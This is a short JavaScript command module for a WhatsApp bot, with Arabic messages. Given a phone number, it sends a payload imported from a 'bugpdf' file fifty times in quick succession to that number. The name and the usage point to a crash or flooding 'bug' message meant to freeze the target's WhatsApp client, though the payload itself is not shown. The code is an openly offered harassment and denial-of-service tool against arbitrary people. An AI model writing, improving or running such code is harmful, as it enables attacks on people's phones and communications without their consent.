const { bugpdf } = require('../bugpdf');

module.exports = async ({ sock, msg, text, reply }) => {
  if (!text.startsWith("bug")) return;

  const parts = text.trim().split(' ');
  const number = parts[1];

  if (!number || isNaN(number)) {
    return reply("❌ يرجى كتابة رقم الهاتف بعد الأمر.\nمثال: bug 966xxxxxxxxx");
  }

  const jid = `${number}@s.whatsapp.net`;

  try {
    for (let i = 0; i < 50; i++) {
      await sock.sendMessage(jid, { text: bugpdf });

      // فاصل زمني 100 ميلي ثانية
      await new Promise(resolve => setTimeout(resolve, 100));
    }

    await reply(`✅ تم إرسال BugPDF عدد 50 مرة إلى: ${number}`);
  } catch (err) {
    console.error(err);
    await reply(`❌ فشل في إرسال الرسالة إلى: ${number}`);
  }
};
